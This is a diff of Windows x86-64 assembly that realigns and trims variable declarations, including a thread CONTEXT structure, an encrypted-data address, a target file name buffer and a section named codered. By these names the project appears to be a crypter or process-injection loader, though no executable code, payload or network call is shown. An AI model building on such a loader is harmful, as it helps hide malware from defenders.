@@ -4,11 +4,10 @@
 ;**************
 global WinMain
 
-section .bss
-    tm                                              resq 8
+section .bss 
     tamTotal                                        resq 8
     NameArgv0                                       resb 32
-    AddressAlocadoV resq 8
+    AddressAlocadoV                                 resq 8
     addressAllocTarget                              resq 8
     addressAllocArv0                                resq 8
     addressCrypted                                  resq 8
@@ -28,9 +27,9 @@ section .bss
     Ptrt                                            resq 8
     void                                            resq 8
     address750                                      resq 8
-    NumSection resq 8
-    handle resq 8
-    BufferFileNameTarget resq 0x100
+    NumSection                                      resq 8
+    handle                                          resq 8
+    BufferFileNameTarget                            resb 0x100
 	
     struc CONTEXT
        .P1Home:                                     resq 1
@@ -127,8 +126,6 @@ section .data
     Ptrt0                                            dq 0x00
     ptr17f0                                          dd 0x01
     address7ec                                       dd 0
-    bool dq 1
-    tamArq dq 0
 	
 section codered
 	CodeRed:
